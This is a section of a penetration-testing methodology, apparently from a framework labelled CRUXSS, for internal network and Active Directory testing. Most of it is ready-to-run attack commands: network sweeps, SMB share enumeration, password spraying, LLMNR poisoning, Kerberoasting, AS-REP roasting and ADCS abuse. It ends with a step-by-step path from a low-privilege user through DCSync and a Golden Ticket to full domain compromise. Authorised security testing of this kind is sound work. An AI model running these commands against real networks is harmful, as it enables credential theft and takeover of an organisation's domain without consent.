## 3N. Internal Network Testing (if in scope)
*CRUXSS-INT-RCON-01 through -08 | CRUXSS-INT-CRED-01 through -08 | CRUXSS-INT-LAT-01 through -07*

> Only applicable if target is an internal network pentest or you have pivoted inside.

```bash
# Internal host discovery (CRUXSS-INT-RCON-01)
nmap -sn 10.0.0.0/8 -oG session/internal-hosts.txt

# Network share enumeration (CRUXSS-INT-RCON-03)
crackmapexec smb 10.0.0.0/24 --shares | tee session/shares.txt

# Active Directory enumeration (CRUXSS-INT-RCON-04)
# bloodhound-python -d DOMAIN -u USER -p PASS -c All --zip
# Results → BloodHound GUI → find shortest path to Domain Admin

# Password spraying — respect lockout policy! (CRUXSS-INT-CRED-01)
# kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'Summer2024!'

# LLMNR / NBT-NS poisoning (CRUXSS-INT-CRED-02)
# responder -I eth0 -rdwv

# Kerberoasting (CRUXSS-INT-CRED-04)
# impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request
# hashcat -a 0 -m 13100 hashes.txt wordlist.txt

# AS-REP Roasting (CRUXSS-INT-CRED-05)
# impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP

# ADCS abuse (CRUXSS-INT-PRIV-04)
# certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable
```

### Active Directory Attack Path (CRUXSS-INT-PRIV-03, CRUXSS-INT-DOM-01 through -05)
```
Low-priv user
  → Kerberoast service account (CRUXSS-INT-CRED-04)
  → Crack hash → plaintext password
  → ACL abuse: WriteDACL/GenericAll → CRUXSS-INT-LAT-06
  → DCSync (CRUXSS-INT-DOM-01)
  → Extract krbtgt hash
  → Golden Ticket (CRUXSS-INT-DOM-02)
  → Full domain compromise
```

---

